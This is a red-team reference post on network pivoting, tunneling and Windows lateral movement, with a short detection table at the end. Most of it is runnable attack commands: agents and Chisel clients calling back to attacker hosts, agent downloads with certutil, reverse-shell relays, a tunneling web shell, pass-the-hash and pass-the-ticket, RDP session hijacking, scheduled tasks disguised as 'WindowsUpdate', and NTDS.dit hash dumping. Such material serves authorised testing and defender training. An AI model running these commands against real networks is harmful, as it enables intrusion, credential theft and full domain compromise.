---
title: Pivoting, Tunneling and Lateral Movement
date: 2026-06-15
image: cover.svg
tags: [Red Team, Pivoting, Lateral Movement]
excerpt: A practical reference covering every pivoting and tunneling technique you will reach for on an internal engagement - SSH, Ligolo-NG, Chisel, Chisel, socat, sshuttle, DNS/ICMP tunneling - plus a full lateral movement playbook for Windows environments.
---

# Pivoting, Tunneling and Lateral Movement

Once you have a foothold on an internal machine, the real work begins. Getting from one network segment to another, reaching hosts that have no direct route to you, and moving laterally to higher-value targets without triggering detections - these are the skills that separate a basic shell from a full domain compromise.

This post is a practical reference covering the full spectrum: port forwarding, SOCKS proxies, tunneling over SSH/HTTP/DNS/ICMP, and lateral movement techniques for Windows environments.

---

## Key Concepts

**Pivoting** - using a compromised host as a relay to reach network segments that are otherwise inaccessible from your attack machine. The compromised host acts as a "jump point."

**Tunneling** - encapsulating one protocol inside another to bypass firewall rules or network controls. Common examples: TCP over SSH, traffic over HTTP/HTTPS, or data inside DNS queries.

**Lateral Movement** - techniques used to move from one host to another within the same network, typically to reach higher-value targets or escalate privileges.

**SOCKS Proxy** - a general-purpose proxy protocol (SOCKS4/SOCKS5) that lets you route arbitrary TCP (and with SOCKS5, UDP) connections through a pivot host. Tools like `proxychains` sit in front of any tool and route its traffic through the proxy.

**RVA (Relative Virtual Address)** vs **port forwarding** - port forwarding maps one specific local port to one specific remote port. A SOCKS proxy is more flexible: a single listener handles any destination the tool requests.

---

## ProxyChains

ProxyChains is the standard tool for routing any TCP-based tool through a SOCKS proxy. It intercepts `connect()` system calls via `LD_PRELOAD` and redirects them through the proxy chain.

```bash
# Install
sudo apt install proxychains4

# Edit the config (usually /etc/proxychains4.conf or create a local one)
```

Key config options:

```ini
# Chain mode:
strict_chain      # Every proxy must work in order. Fail = abort.
dynamic_chain     # Skip dead proxies, continue with next.
random_chain      # Pick a random proxy from the list each time.

quiet_mode        # Suppress per-connection output
proxy_dns         # Resolve DNS through the proxy (prevents DNS leaks)
remote_dns_subnet 224

tcp_read_time_out 15000
tcp_connect_time_out 8000

localnet 127.0.0.0/255.0.0.0  # Do not proxy localhost traffic

[ProxyList]
socks5  127.0.0.1 1080
# socks4  127.0.0.1 9050
```

If you want to scan ports with nmap through proxychains, the correct command is:

```bash
proxychains nmap -sT -Pn -p 22,80,443,445,3389 internal.server.local
```

> [!NOTE]
> Proxychains only supports **TCP connect scans** (`-sT`). SYN scans (`-sS`) require raw sockets and will not work through a SOCKS proxy. Always add `-Pn` to skip the ICMP ping - ICMP will not traverse the proxy either.

---

## SSH Port Forwarding

SSH is the most universally available tunneling tool. Every Linux system has it, and OpenSSH is available on modern Windows. The three modes you need to know cold:

## Local Port Forwarding & Remote Port Forwarding

### Local Port Forwarding

```bash
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```

Maps a local port on your machine to a port on a host reachable from the SSH server. Traffic sent to your local port travels over the SSH tunnel and exits at `[dsthost]:[dstport]` from the perspective of the SSH server.

**Example** - reach a web server on an internal network only the jump box can access:

```bash
ssh -L 8080:192.168.10.5:80 user@jumpbox.example.com
# Now browse http://127.0.0.1:8080 to reach 192.168.10.5:80 via the jump box
```

**Example** - reach an MSSQL server behind a firewall:

```bash
ssh -L 1433:db.internal:1433 user@bastion
# Connect your SQL client to 127.0.0.1:1433
```

Useful flags:

| Flag | Description |
| ---- | ----------- |
| `-f` | Fork to background before executing |
| `-N` | Do not execute a remote command (tunnel only) |
| `-T` | Disable pseudo-terminal allocation |
| `-C` | Compress traffic |
| `-g` | Allow remote hosts to connect to locally forwarded ports |

### Remote Port Forwarding

```bash
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
```

The SSH server opens a port on itself and forwards incoming connections back to a host/port reachable from your local machine. This is used when the target cannot reach you directly (e.g., the target is behind NAT but can make outbound SSH connections).

**Example** - expose your local Metasploit listener through a VPS to a target that can only reach the VPS:

```bash
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@vps.example.com -N -f
# Payload uses LHOST=vps.example.com LPORT=4444
# Connection routes: target -> VPS:4444 -> your machine:4444
```

**Example** - give a target shell access to your local machine's internal service:

```bash
ssh -R 8080:10.0.0.5:80 user@target
```

### Dynamic SOCKS Proxy

```bash
ssh -D [bindaddr]:[port] user@[host] -N -f
```

The most powerful mode. SSH opens a SOCKS4/SOCKS5 proxy on your local machine. Any traffic sent to that port is forwarded through the SSH tunnel and exits from the remote server, which then routes it to the actual destination.

```bash
# Create a SOCKS proxy on local port 1080 through jumpbox
ssh -D 127.0.0.1:1080 user@jumpbox.example.com -N -f -C

# Use it with proxychains
proxychains nmap -sT -Pn -p- 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

---

## Resources

- [InternalAllTheThings - Pivoting Techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/#graftcp)
- [Ligolo-NG Pivoting Guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)

---

## Double Pivoting using SSH and ProxyChains4

Resource: [Proxychains Double Pivoting](https://theyhack.me/Proxychains-Double-Pivoting/)

### The Layout

| IP | Hostname | Notes |
| --- | --- | --- |
| 192.168.122.125 | `attack` | My box |
| 192.168.122.172 | `jumpbox1.local` | First jump box |
| 192.168.122.212 | `jumpbox2.local` | Second jump box |
| 192.168.122.181 | `destbox.local` | Final machine |

This is how the environment looks like:

You can use your imagination on what `jumpbox1.local`, `jumpbox2.local`, and `destbox.local` are - webserver, fileserver, privileged workstation, DC. Important thing to know is:

- `attack` can only talk to `jumpbox1.local`
- `jumpbox1.local` can only talk to `jumpbox2.local`
- `jumpbox2.local` can only talk to `destbox.local`

### Connecting to the first machine:

```bash
they@attack.local:~$ ssh -f -N -D 127.0.0.1:8888 user@jumpbox1.local
```

What each flag does:

| Flag | Explanation |
| --- | --- |
| `-f` | Send the command to background right before executing remotely (like `command &`) |
| `-N` | Do not execute a remote command - just establish the tunnel/proxy |
| `-D` | Establish a local dynamic application-level port forwarding (SOCKS proxy) on this local port |

Once the SOCKS proxy is established, use `proxychains4` to communicate over the tunnel. Create a local config file:

proxychains4.conf (first hop):

```ini
strict_chain
quiet_mode
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0

[ProxyList]
socks4  127.0.0.1 8888
```

Now establish the second hop through `jumpbox2`:

```bash
they@attack.local:~$ proxychains4 -f ~/new-proxychains.conf ssh -f -N -D 127.0.0.1:9999 user@jumpbox2.local
```

This command uses the first SOCKS proxy (via `jumpbox1`) to SSH into `jumpbox2` and create a second SOCKS proxy on local port `9999`. Update the config to chain both:

proxychains4.conf (chained - two hops):

```ini
strict_chain
quiet_mode
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0

[ProxyList]
socks4  127.0.0.1 8888   # attack -> jumpbox1.local
socks4  127.0.0.1 9999   # jumpbox1.local -> jumpbox2.local
```

Port `9999` is there because proxychains first proxies through `127.0.0.1:8888` (reaching `jumpbox1`), then proxies through `127.0.0.1:9999` on `jumpbox1` (reaching `jumpbox2`). `strict_chain` means each proxy in the list must succeed in order. You can use `dynamic_chain` if you want it to skip failed proxies.

The simplified version of the whole flow:

```bash
# Pivot 1
ssh -D 1080 user@IP_Network1

# Configure proxychains to use port 1080

# Pivot 2 (through the first pivot)
proxychains ssh -D 1081 user@IP_Network2

# Configure proxychains to use port 1081
# Now scan through both pivots
proxychains nmap -sT -Pn -p- 192.168.122.181
```

---

## Double Pivoting using Ligolo-NG

Reference: [Ligolo-NG Guide](https://infod33p4k.github.io/posts/blog/ligolo-ng/)

Ligolo-NG is far superior to SSH + proxychains for multi-hop pivoting. It creates a TUN interface on your attack machine so traffic routes transparently at the network level - no proxychains wrapping, no TCP-only limitation, no performance hit from strict_chain. Any tool that works normally will work through Ligolo routes without modification.

This is how the environment looks like:

{% image %}

**Setup on your Kali machine - create the TUN interface:**

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

**Start the Ligolo proxy (C2 server side):**

```bash
./proxy -selfcert
# Listening on :11601 by default
```

**On the first compromised machine, run the agent:**

```bash
./agent -connect kali_ip:11601 -ignore-cert
```

**Inside the Ligolo console:**

```bash
# List sessions
session

# Pick the agent that connected, then inspect its interfaces
ifconfig

# Add a route through ligolo to reach the internal subnet
# (do this on your Kali machine, in a separate terminal)
sudo ip route add 10.10.8.0/24 dev ligolo

# Start routing traffic through this session
start
```

Once `start` is running, any traffic your Kali machine sends toward `10.10.8.0/24` routes through the Ligolo TUN interface and exits from the agent - fully transparent, no proxychains needed. Run nmap, crackmapexec, impacket tools directly.

### Starting the Double Pivot

Now that you can reach the `10.10.8.0/24` subnet, you need to reach a further segment (e.g., `172.16.0.0/24`) reachable only from a machine in the first internal subnet.

**Create a second TUN interface for the second hop:**

```bash
sudo ip tuntap add user kali mode tun ligolo-double
sudo ip link set ligolo-double up
```

**Create a listener on the first agent so the second agent can call back through it:**

```bash
# In the Ligolo console (while on the first session)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list   # confirm it's active
```

This listener runs on the first compromised machine. The second agent connects to `<first_machine_IP>:11601`, which gets forwarded back to your Kali Ligolo proxy on `127.0.0.1:11601`.

**Deploy and run the agent on the second machine (reachable from the first internal subnet):**

```bash
./agent -connect 10.10.8.9:11601 -ignore-cert
```

**Back in the Ligolo console:**

```bash
session                  # pick the new session (from the second machine)
ifconfig                 # identify the new internal subnet (172.16.0.0/24)
```

**On Kali, add the route for the new subnet through the second TUN interface:**

```bash
sudo ip route add 172.16.0.0/24 dev ligolo-double
tunnel_start --tun ligolo-double
```

You can repeat this pattern as many hops as needed. Each new agent requires a listener on the previous agent's machine to relay the connection back.

### Performing File Transfers and Reverse Shells

This is how the environment looks like:

{% image2 %}

We currently have just a ligolo agent running on the Ubuntu host (for the internal network: `10.10.8.0/24`).

Now we will also pwn DC2 and run the agent on it so we can access the `172.16.0.0/24` subnet. Before doing this, set up the listeners in the Ligolo console:

```bash
# Forward agent traffic from DC2 back to Kali
listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601

# Forward HTTP file server traffic (for downloading the agent to DC2)
# DC2 will connect to 10.10.8.9:2000, which forwards to Kali:31337
listener_add --addr 0.0.0.0:2000 --to 0.0.0.0:31337
```

Start a Python HTTP server on Kali on port `31337` to serve the agent binary:

```bash
python3 -m http.server 31337
```

On DC2, download the agent via the forwarded listener port:

```bash
# Windows
certutil.exe -urlcache -split -f http://10.10.8.9:2000/agent.exe agent.exe

# Or with PowerShell
Invoke-WebRequest -Uri http://10.10.8.9:2000/agent.exe -OutFile agent.exe
```

Then run it:

```bash
.\agent.exe -connect 10.10.8.9:11601 -ignore-cert
```

### Catching the Reverse Shell

When generating the reverse shell payload, set `LHOST` to the IP of the first compromised machine (the Ubuntu host at `10.10.8.9`), not your Kali IP:

{% image3 %}

On the listener side, create a Ligolo listener that forwards incoming connections from the first machine back to your Kali netcat/msfconsole listener:

{% image4 %}

```bash
# In Ligolo console - forward connections arriving on first machine port 1111 to Kali port 40000
listener_add --addr 0.0.0.0:1111 --to 0.0.0.0:40000

# On Kali - catch the shell
nc -lvnp 40000
```

The flow: `DC2 -> 10.10.8.9:1111 -> Ligolo listener -> Kali:40000`.

### Accessing Localhost Ports on Remote Machines

Ligolo assigns the `240.0.0.0/4` range to represent the loopback interface of the currently selected agent session. This lets you reach services bound to `127.0.0.1` on a remote machine.

```bash
# Create a dedicated interface for accessing localhost ports on the target
sudo ip tuntap add user kali mode tun ligolo-localhost
sudo ip link set ligolo-localhost up

# Add the route for the target's normal subnet (already done in most cases)
sudo ip route add 172.16.0.0/24 dev ligolo-localhost

# Add the special Ligolo loopback route for this agent
sudo ip route add 240.0.0.5/32 dev ligolo-localhost

# Now scan localhost ports on the agent machine
nmap -Pn 240.0.0.5 -p 5000,8080,9090
```

### Ligolo Builtin Commands

```bash
# Create a named interface and route without touching the OS directly
interface_create --name Internal
route_add --name Internal --route 192.168.2.0/24
tunnel_start --tun Internal

# Listeners
listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT --tcp
listener_list
listener_stop --id 0

# Session management
session                 # list and select sessions
ifconfig                # show network interfaces on the current agent
```

---

## Chisel

[Chisel](https://github.com/jpillora/chisel) is a fast TCP/UDP tunnel over HTTP, secured with SSH transport. It requires no SSH daemon on the target - just drop a single binary. The server runs on your attack machine; the client runs on the target.

### Reverse SOCKS Proxy

The most common usage pattern - the target calls out to you and provides a SOCKS proxy:

```bash
# Attack machine - start the server in reverse mode
./chisel server -p 1337 --reverse &

# Target machine - connect back and create a SOCKS proxy
./chisel client 10.50.46.8:1337 R:socks &

# Traffic through the SOCKS proxy
# Add to proxychains.conf:
#   socks5 127.0.0.1 1080
proxychains crackmapexec smb 10.10.10.0/24
```

The `R:` prefix means "reverse" - the client opens the port on the server side. Without `R:` the port opens on the client side (normal forward).

### Local Port Forwarding via Chisel

```bash
# Server side (attack machine)
./chisel server -p 8080

# Client side (target) - forward target's local port 3306 to attack:13306
./chisel client attacker_ip:8080 13306:127.0.0.1:3306

# Now connect to MySQL on the target via attack machine port 13306
mysql -h 127.0.0.1 -P 13306 -u root -p
```

### Remote Port Forwarding via Chisel

```bash
# Expose a port on the target to the attack machine
./chisel server -p 8080 --reverse

./chisel client attacker_ip:8080 R:9090:127.0.0.1:9090
# attack_machine:9090 now reaches target:9090
```

### Chisel with Authentication

```bash
./chisel server -p 1337 --reverse --auth user:password
./chisel client --auth user:password attacker:1337 R:socks
```

---

## socat

`socat` is a Swiss-army knife for network relaying. It is available on most Linux systems and can be used for simple port forwarding without SSH.

### Basic Port Forward

```bash
# Forward local port 8080 to remote host:port
socat TCP-LISTEN:8080,fork TCP:internal.host:80

# Forward to a host reachable from this machine
socat TCP-LISTEN:443,fork TCP:192.168.1.10:443
```

### Reverse Shell Relay

Useful when you need to relay a reverse shell through a pivot host:

```bash
# On pivot host - relay incoming connections on 4444 to attacker:4444
socat TCP-LISTEN:4444,fork TCP:attacker.ip:4444

# Payload targets the pivot host, attacker catches the shell
```

### UDP Forward

```bash
socat UDP-LISTEN:53,fork UDP:192.168.1.1:53
```

### Encrypted Relay with TLS

```bash
# Generate a self-signed cert
openssl req -newkey rsa:2048 -nodes -keyout relay.key -x509 -days 90 -out relay.crt
cat relay.crt relay.key > relay.pem

# TLS listener relaying to a plaintext destination
socat OPENSSL-LISTEN:443,cert=relay.pem,verify=0,fork TCP:127.0.0.1:8080
```

---

## sshuttle

`sshuttle` turns an SSH connection into a transparent VPN. It routes entire subnets through the SSH connection without requiring root on the remote machine (only your local machine needs it). Unlike `ssh -D`, it handles DNS too and works with UDP-dependent tools.

```bash
# Route entire subnet through the jump box
sshuttle -r user@jumpbox 10.10.10.0/24

# Route multiple subnets
sshuttle -r user@jumpbox 10.10.10.0/24 192.168.1.0/24

# Exclude a specific host from the tunnel
sshuttle -r user@jumpbox 10.10.10.0/24 --exclude 10.10.10.5

# Use a specific SSH key
sshuttle -r user@jumpbox --ssh-cmd "ssh -i ~/.ssh/id_rsa" 10.10.10.0/24

# Route everything including DNS
sshuttle -r user@jumpbox --dns 0/0
```

After running sshuttle, all traffic destined for the specified subnets is transparently routed through the jump box. No proxychains needed.

---

## RevSOCKS

RevSOCKS is a reverse SOCKS5 proxy tool written in Go. The client on the target connects out to your server, which then exposes a SOCKS5 proxy to use.

### How to Build for Linux

```bash
# Build for Linux
git clone https://github.com/kost/revsocks
export GOPATH=~/go
go get github.com/hashicorp/yamux
go get github.com/armon/go-socks5
go get github.com/kost/go-ntlmssp
go build
go build -ldflags="-s -w" && upx --brute revsocks

# Build for Windows
go get github.com/hashicorp/yamux
go get github.com/armon/go-socks5
go get github.com/kost/go-ntlmssp
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
go build -ldflags -H=windowsgui
upx revsocks
```

### Usage Commands

```bash
# Listen on the server and create a SOCKS5 proxy on port 1080
user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234

# Connect client to the server (basic)
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234

# Connect through a corporate proxy with NTLM auth
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 \
    -proxy proxy.domain.local:3128 \
    -proxyauth Domain/username:userpass \
    -useragent "Mozilla 5.0/IE Windows 10"
```

The corporate proxy bypass with NTLM auth is particularly useful in environments where direct outbound connections are blocked but HTTP CONNECT through the proxy is allowed.

---

## Neo-reGeorg - Web SOCKS

Reference: [Neo-reGeorg README](https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md)

Neo-reGeorg tunnels SOCKS5 traffic over HTTP by planting a server-side web shell (PHP, JSP, ASPX, Go) on a compromised web server. Useful when the only outbound path from a network is HTTP/HTTPS to a web application you control.

### Basic Usage & Commands

1. Generate the tunnel server files with a shared password:

```bash
$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.go
```

Upload the appropriate file for the target's web stack (e.g., `tunnel.php` for PHP apps).

2. Connect to the uploaded tunnel and expose a local SOCKS5 proxy:

```bash
$ python3 neoreg.py -k password -u http://xx/tunnel.php
+------------------------------------------------------------------------+
  Log Level set to [DEBUG]
  Starting socks server [127.0.0.1:1080]
  Tunnel at:
    http://xx/tunnel.php
+------------------------------------------------------------------------+
```

Configure proxychains to use `socks5 127.0.0.1 1080` and all traffic routes through HTTP to the web shell.

**Over HTTPS (bypasses HTTP inspection):**

```bash
python3 neoreg.py -k password -u https://target.com/tunnel.php --skip-verifiy
```

---

## DNS Tunneling

When all TCP/UDP ports are blocked but DNS is allowed outbound, DNS tunneling encapsulates data inside DNS queries and responses. Slow but reliable in heavily restricted environments.

### dnscat2

[dnscat2](https://github.com/iagox86/dnscat2) creates an encrypted C2 channel over DNS.

```bash
# On your server (needs control of a domain or direct DNS access)
ruby dnscat2.rb --dns "domain=tunnel.yourdomain.com,host=0.0.0.0" --no-cache

# On the target
./dnscat --dns server=ns1.yourdomain.com,domain=tunnel.yourdomain.com

# Inside dnscat2 console - create a port forward
window -i 1
listen 127.0.0.1:2222 10.10.10.5:22
```

### iodine

[iodine](https://github.com/yarrick/iodine) tunnels IPv4 over DNS. Faster than dnscat2 for bulk transfers.

```bash
# Server side (needs authoritative DNS for a subdomain)
iodined -f 10.0.0.1 tunnel.yourdomain.com

# Client side
iodine -f -P password ns1.yourdomain.com tunnel.yourdomain.com
# Creates a tun0 interface with IP 10.0.0.2

# Route traffic through the tunnel
ssh user@10.0.0.1 -D 1080 -N -f
```

---

## ICMP Tunneling

ICMP (ping) is often allowed outbound even when TCP/UDP is blocked. Tools tunnel TCP over ICMP echo request/reply pairs.

### ptunnel-ng

```bash
# Server side (on a machine reachable via ping)
sudo ptunnel-ng -p 0.0.0.0

# Client side - forward local port 2222 to SSH on the server
sudo ptunnel-ng -p server_ip -lp 2222 -da server_ip -dp 22

# SSH through the ICMP tunnel
ssh user@127.0.0.1 -p 2222 -D 1080 -N -f
```

---

## Capture Network Traffic with Builtin Tools

Sometimes you need to capture traffic directly from a compromised host without installing Wireshark.

### Windows - netsh

```bash
# Start a capture
netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384

# Stop the trace
netsh trace stop

# Persist across reboots
netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384

# Convert ETL to pcapng for Wireshark
etl2pcapng.exe c:\trace.etl c:\trace.pcapng

# Filter by IP address and protocol
netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
```

### Linux - tcpdump

```bash
sudo apt-get install tcpdump

# Capture all traffic on eth0 to a file
tcpdump -w 0001.pcap -i eth0

# Print packets in ASCII
tcpdump -A -i eth0

# Capture only TCP
tcpdump -i eth0 tcp

# Capture only port 22
tcpdump -i eth0 port 22

# Capture credentials in cleartext protocols (FTP, HTTP, Telnet)
tcpdump -i eth0 -s 0 -A 'tcp port 21 or tcp port 23 or tcp port 80'

# Write to file and filter simultaneously
tcpdump -i eth0 -w capture.pcap host 10.10.10.5 and tcp port 443
```

---

# Lateral Movement

Lateral movement is how you turn a foothold on one host into access on another. The goal is to reach higher-value targets - domain controllers, file servers, privileged workstations - while blending into normal administrative activity.

## PsExec

PsExec (and its many reimplementations) uses SMB and the Windows Service Control Manager to execute commands remotely. It creates a named pipe, uploads a service binary to `ADMIN$`, installs it as a Windows service, runs the command, then cleans up.

```bash
# Impacket's psexec (Linux)
impacket-psexec domain/user:password@target_ip

# With pass-the-hash
impacket-psexec -hashes :NTLMhash domain/user@target_ip

# With Kerberos ticket
KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass domain/user@target_ip

# Sysinternals PsExec (Windows)
PsExec.exe \\target -u domain\user -p password cmd.exe

# Run a specific command
PsExec.exe \\target -u domain\user -p password ipconfig /all
```

> [!NOTE]
> PsExec requires the SMB port (445) to be reachable, the `ADMIN$` share to be accessible, and the account to have local admin rights on the target. It creates a Windows service named `PSEXESVC` - very loud on endpoints with EDR.

## SMBExec

SMBExec avoids writing a service binary to disk. Instead it runs commands via SMB through a service that executes a cmd.exe shell command and returns output through a shared file. Slightly stealthier than PsExec.

```bash
impacket-smbexec domain/user:password@target_ip
impacket-smbexec -hashes :NTLMhash domain/user@target_ip
```

## WMI (Windows Management Instrumentation)

WMI lets you run commands on remote systems through DCOM. No service binary is written; the process is spawned by `WmiPrvSE.exe`. Often less monitored than PsExec.

```bash
# Impacket wmiexec - interactive shell
impacket-wmiexec domain/user:password@target_ip

# With pass-the-hash
impacket-wmiexec -hashes :NTLMhash domain/user@target_ip

# Execute a single command and exit
impacket-wmiexec domain/user:password@target_ip "whoami /all"
```

From Windows using `wmic`:

```bash
# Run a command on a remote host
wmic /node:target_ip /user:domain\user /password:password process call create "powershell -e <base64>"

# Query running processes
wmic /node:target_ip /user:domain\user /password:password process list brief
```

From PowerShell:

```powershell
# Create a process on a remote host via WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c whoami > C:\output.txt" `
    -ComputerName target_ip -Credential $cred
```

## WinRM / Evil-WinRM

WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management. It runs on port 5985 (HTTP) and 5986 (HTTPS). Members of the `Remote Management Users` group or local admins can use it.

```bash
# Evil-WinRM (Linux) - interactive shell
evil-winrm -i target_ip -u user -p password

# With pass-the-hash
evil-winrm -i target_ip -u user -H NTLMhash

# With a Kerberos ticket
KRB5CCNAME=ticket.ccache evil-winrm -i target_ip -u user -r DOMAIN.LOCAL

# Load PowerShell scripts directly into the session
evil-winrm -i target_ip -u user -p password -s /path/to/scripts/

# Upload / download files
upload /local/path/file.exe C:\Windows\Temp\file.exe
download C:\Users\user\Desktop\secrets.txt
```

From PowerShell (Windows):

```powershell
# Create a PSSession and run commands
$sess = New-PSSession -ComputerName target_ip -Credential (Get-Credential)
Invoke-Command -Session $sess -ScriptBlock { whoami; hostname }
Enter-PSSession -Session $sess   # interactive session
```

## Pass-the-Hash (PtH)

Pass-the-Hash uses an NTLM hash directly for authentication without knowing the plaintext password. Works against any service using NTLM authentication (SMB, WMI, RDP with NLA disabled, etc.).

```bash
# CrackMapExec - spray PtH across a subnet
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLMhash

# Impacket tools accept hashes in LMHASH:NTHASH format
# Use an empty LM hash (aad3b435b51404eeaad3b435b51404ee) with the real NT hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLMhash domain/user@target

# Mimikatz - run a process under stolen hash credentials
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:NTLMhash /run:cmd.exe
```

## Pass-the-Ticket (PtT)

Pass-the-Ticket uses a stolen Kerberos TGT or service ticket (TGS) to authenticate without the password or hash. Requires a valid `.ccache` or `.kirbi` ticket file.

```bash
# Rubeus (Windows) - inject a ticket into the current session
Rubeus.exe ptt /ticket:base64_ticket_or_file.kirbi

# Mimikatz - inject a .kirbi ticket
kerberos::ptt ticket.kirbi

# Export tickets from memory
sekurlsa::tickets /export

# Impacket - use a ticket for remote commands
KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass user@target.domain.local
KRB5CCNAME=ticket.ccache impacket-wmiexec -k -no-pass user@target.domain.local
KRB5CCNAME=ticket.ccache evil-winrm -i target -r DOMAIN.LOCAL -u user
```

## Overpass-the-Hash (Pass-the-Key)

Converts an NTLM hash or AES key into a Kerberos TGT, then uses that TGT for ticket-based auth. Useful when NTLM is blocked and only Kerberos is allowed.

```bash
# Mimikatz - get a TGT from an NTLM hash
sekurlsa::pth /user:user /domain:DOMAIN /ntlm:NTLMhash /run:"klist"

# Impacket - request a TGT directly
impacket-getTGT DOMAIN/user -hashes :NTLMhash
KRB5CCNAME=user.ccache impacket-psexec -k -no-pass user@target.domain.local
```

## DCOM (Distributed COM)

DCOM lets you instantiate COM objects on remote machines and call methods on them. No service binary is written; execution happens through legitimate COM infrastructure.

```powershell
# MMC20.Application - classic DCOM lateral movement
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "target_ip"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\output.txt", "7")

# ShellWindows - alternative DCOM object
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Shell.Application", "target_ip"))
$com.ShellExecute("cmd.exe", "/c whoami > C:\output.txt", "C:\Windows\System32", $null, 0)
```

```bash
# Impacket dcomexec
impacket-dcomexec -object MMC20 domain/user:password@target_ip "cmd /c whoami"
impacket-dcomexec -object ShellWindows domain/user:password@target_ip "cmd /c whoami"
impacket-dcomexec -hashes :NTLMhash -object MMC20 domain/user@target_ip "cmd /c whoami"
```

## Remote Services (sc.exe / Services)

Create and start a remote service to execute code. Requires SMB access and local admin on the target.

```bash
# Create a remote service
sc.exe \\target_ip create evil binPath= "cmd.exe /c whoami > C:\output.txt"

# Start it
sc.exe \\target_ip start evil

# Delete after use
sc.exe \\target_ip delete evil
```

## Scheduled Tasks (at / schtasks)

```bash
# Create a scheduled task on a remote host (legacy at command, still works on many systems)
net use \\target_ip\IPC$ password /user:domain\user
at \\target_ip 10:00 "cmd /c whoami > C:\output.txt"

# schtasks - more flexible
schtasks /create /s target_ip /u domain\user /p password \
    /tn "WindowsUpdate" /tr "cmd /c powershell -e <b64>" \
    /sc once /st 10:00 /ru System

schtasks /run /s target_ip /tn "WindowsUpdate"
schtasks /delete /s target_ip /tn "WindowsUpdate" /f
```

## RDP Hijacking

Active RDP sessions can be hijacked without credentials if you have SYSTEM privileges on the same machine.

```bash
# List active sessions
query user /server:target_ip

# Hijack a session using tscon (no password required from SYSTEM)
# Create a service that runs tscon as SYSTEM
sc create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1"
sc start hijack
```

The above hijacks session ID 2 and redirects it to your RDP session `rdp-tcp#1`. No credentials needed when running as SYSTEM.

## Token Impersonation

Steal a token from a privileged process running on the same machine and impersonate it for lateral movement.

```bash
# Metasploit
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# Mimikatz
privilege::debug
token::elevate
token::list
token::impersonate /id:PID
```

## Impacket Cheat Sheet

The Impacket suite covers most Windows lateral movement scenarios from Linux:

| Tool | Usage |
| ---- | ----- |
| `impacket-psexec` | SMB + SCM execution |
| `impacket-smbexec` | SMB execution without binary on disk |
| `impacket-wmiexec` | WMI execution |
| `impacket-dcomexec` | DCOM execution |
| `impacket-atexec` | Task scheduler execution |
| `impacket-smbclient` | Interactive SMB shell |
| `impacket-secretsdump` | Dump SAM, LSA secrets, NTDS.dit hashes |
| `impacket-getTGT` | Request a Kerberos TGT |
| `impacket-getST` | Request a Kerberos Service Ticket |

```bash
# Dump all hashes from a domain controller
impacket-secretsdump domain/user:password@dc_ip

# With pass-the-hash
impacket-secretsdump -hashes :NTLMhash domain/user@dc_ip

# Remote SAM dump
impacket-secretsdump local -sam sam.save -system system.save -security security.save
```

> [!EXPLOIT]
> `secretsdump` targeting a DC with a domain admin hash dumps the entire `NTDS.dit` database - all domain user hashes. This is the endgame of most AD engagements.

---

## Detection Notes

For each technique, the key detection signals:

| Technique | Key Indicators |
| --------- | -------------- |
| SSH tunneling | Unusual SSH connections from servers, long-lived SSH sessions, non-interactive SSH processes |
| Chisel / Ligolo | Unknown binaries on disk, TUN interface creation, unusual outbound HTTP on non-standard ports |
| PsExec | `PSEXESVC` service creation, `ADMIN$` write, service install event (4697) |
| WMI | `WmiPrvSE.exe` spawning child processes, WMI subscription events (5861) |
| WinRM | WinRM connections from unexpected sources, `wsmprovhost.exe` spawning shells |
| Pass-the-Hash | NTLM authentication from unusual sources, event 4624 logon type 3 with no matching Kerberos |
| DCOM | `mmc.exe` / `explorer.exe` network connections, unexpected DCOM activation events |
| Scheduled tasks | Event 4698 (task created), 4702 (task updated), task names resembling system names |
